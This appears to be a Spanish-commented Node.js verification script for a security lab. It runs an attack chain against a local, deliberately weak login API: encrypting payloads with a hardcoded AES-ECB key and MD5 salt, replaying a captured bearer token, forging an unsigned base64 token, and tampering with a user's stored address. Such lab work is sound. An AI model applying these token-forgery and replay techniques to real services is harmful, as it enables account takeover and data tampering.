/**
 * Verificación E2E de la cadena de ataque (para el operador del lab).
 * Reproduce exactamente lo que hará Kali:
 *   1. Arma el payload igual que la app (crypto-js AES-128-ECB)
 *   2. POST /api/login
 *   3. GET /api/profile con el token (replay)
 *   4. Token forjado desde cero (base64 sin firma)
 *   5. Login con perfil tampering (dirección alterada)
 * No forma parte de la app; es utilidad de verificación.
 *
 * Uso:  node server/test-attack.js   (con server.js corriendo)
 */
const http = require('http');
const crypto = require('crypto');
const CryptoJS = require('../node_modules/crypto-js');

const SECRET_KEY = 'Serv1Go#2026Key!';
const MD5_SALT = 'SG-Parcial-2026:';
const API = 'http://127.0.0.1:5000';

function encryptPayload(obj) {
  const key = CryptoJS.enc.Utf8.parse(SECRET_KEY);
  return CryptoJS.AES.encrypt(JSON.stringify(obj), key, {
    mode: CryptoJS.mode.ECB,
    padding: CryptoJS.pad.Pkcs7,
  }).toString();
}

function hashPassword(p) {
  return CryptoJS.MD5(MD5_SALT + p).toString(CryptoJS.enc.Hex);
}

function req(method, path, body, headers = {}) {
  return new Promise((resolve, reject) => {
    const data = body ? JSON.stringify(body) : null;
    const r = http.request(
      `${API}${path}`,
      {
        method,
        headers: {
          'Content-Type': 'application/json',
          ...(data ? { 'Content-Length': Buffer.byteLength(data) } : {}),
          ...headers,
        },
      },
      (res) => {
        let d = '';
        res.on('data', (c) => (d += c));
        res.on('end', () => resolve({ status: res.statusCode, json: JSON.parse(d || '{}') }));
      }
    );
    r.on('error', reject);
    if (data) r.write(data);
    r.end();
  });
}

(async () => {
  const user = {
    id: 'USR-CLIENT-01',
    email: 'cliente@test.com',
    name: 'Laura Vanessa Gómez',
    role: 'CLIENT',
    phone: '+57 300 456 7890',
    avatar: 'https://images.unsplash.com/photo-1494790108377-be9c29b29330',
    address: 'Calle 7 # 12-45, Barrio Centro, Riohacha',
    latitude: 11.5445,
    longitude: -72.907,
  };

  console.log('--- 1. Login con payload cifrado (igual que la app) ---');
  const payload = encryptPayload({
    action: 'login',
    email: 'cliente@test.com',
    passwordHash: hashPassword('123456'),
    role: 'CLIENT',
    user,
    ts: Date.now(),
  });
  console.log('payload base64 (guardar en /tmp/payload.txt para openssl):');
  console.log(payload);
  const login = await req('POST', '/api/login', { payload });
  console.log('login status:', login.status, '| token:', login.json.token);
  if (login.status !== 200) process.exit(1);

  console.log('\n--- 2. Replay: GET /api/profile con el token capturado ---');
  const prof = await req('GET', '/api/profile', null, {
    Authorization: `Bearer ${login.json.token}`,
  });
  console.log('status:', prof.status, '| profile:', JSON.stringify(prof.json.profile));

  console.log('\n--- 3. Token forjado desde cero (base64, sin clave) ---');
  const forged = Buffer.from(JSON.stringify({ email: 'cliente@test.com', role: 'CLIENT' })).toString(
    'base64url'
  );
  const prof2 = await req('GET', '/api/profile', null, { Authorization: `Bearer ${forged}` });
  console.log('token forjado:', forged);
  console.log('status:', prof2.status, '| ¿entrega perfil?', !!prof2.json.profile);

  console.log('\n--- 4. Tampering: dirección alterada recifrada con la clave robada ---');
  const tamperedUser = { ...user, address: 'Calle Falsa 123 (modificada por el atacante)' };
  const payload2 = encryptPayload({
    action: 'login',
    email: 'cliente@test.com',
    passwordHash: hashPassword('123456'),
    role: 'CLIENT',
    user: tamperedUser,
    ts: Date.now(),
  });
  const login2 = await req('POST', '/api/login', { payload: payload2 });
  const prof3 = await req('GET', '/api/profile', null, {
    Authorization: `Bearer ${login2.json.token}`,
  });
  console.log('status:', login2.status, '| dirección ahora:', prof3.json.profile?.address);

  // Guardar payload para verificación openssl en Kali/Windows
  const fs = require('fs');
  fs.writeFileSync(require('path').join(__dirname, 'last_payload.b64'), payload);
  console.log('\n[OK] payload guardado en server/last_payload.b64');
})();
